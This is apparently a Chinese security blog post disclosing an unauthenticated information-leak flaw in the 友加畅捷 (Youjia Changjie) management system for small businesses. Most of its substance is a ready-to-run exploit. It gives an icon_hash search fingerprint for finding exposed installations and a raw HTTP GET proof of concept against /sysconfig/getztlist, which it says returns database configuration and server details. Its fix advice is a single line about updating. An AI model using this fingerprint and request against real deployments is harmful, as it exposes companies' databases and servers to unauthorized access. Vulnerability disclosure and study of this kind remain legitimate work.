#  友加畅捷管理系统敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-02 02:42  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
01  
  
—  
  
漏洞名称  
# 友加畅捷管理系统敏感信息泄露漏洞  
#   
  
02  
  
—  
  
影响版本  
  
**影响范围**  
：  
友加畅捷管理系统多个版本（如v18、13.7004.1053.1000等  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS3ib0nEmbHzjhFh9RoFUxVAyks2d3SibuyR6mtSywc30MubvW4UsZUKJbTg4Fsy35RXFM3Hzib5IkNg74T5ibV4Arm2MDzDCd0Rnrk/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
友加畅捷管  
理系统是成都友加畅捷科技有限公司研发的一套面向中小企业的信息化管理软件，主要功能涵盖进销存  
、财务、分销及移动管理等领域，旨在帮助企业实现业务与财务的一体化高效运作。  
友加畅捷管理系统接口存在敏感信息泄露漏洞，未经授权的攻击者可通过该接口获取系统敏感信息，如数据库配置、服务器信息等，可能导致系统被进一步攻击或数据泄露  
。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="2049187099"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS1R1D4Sibjgx2L2Fp6zsdmIUuuPmJ6fyp0VUEla3nAfVqJQvfdPJ95SwDxwT1MA4yPrvYfM4trtib5C2jg5MwHbk98GIvnacIYGI/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
GET /sysconfig/getztlist HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=tw1qqzokxwjtxsxpepdkgjtk; toLogin=0
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0IoLFPwdyzM5Y9WlvCvBXMsUPsNia6mKmMFgkzwicEAwqdBzQttQ0iaVPZSYGBcGQSMc9XicYsTHlgkdZkW6LiaibJnFZ85SY95t5iaw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
及时更新系统至最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
